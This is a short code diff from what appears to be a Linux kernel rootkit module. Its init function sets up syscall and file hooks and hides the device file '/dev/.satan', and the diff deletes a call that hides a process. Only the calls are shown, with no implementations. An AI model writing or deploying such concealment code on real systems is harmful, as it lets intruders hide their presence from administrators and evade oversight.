@@ -17,10 +17,7 @@ static int __init satan_init(void)
         satan_cdev_init(THIS_MODULE);
         satan_syscall_init();
         satan_file_init();
-
         satan_file_hide("/dev/.satan");
-        satan_proc_hide(60);
-
         return 0;
 }
 
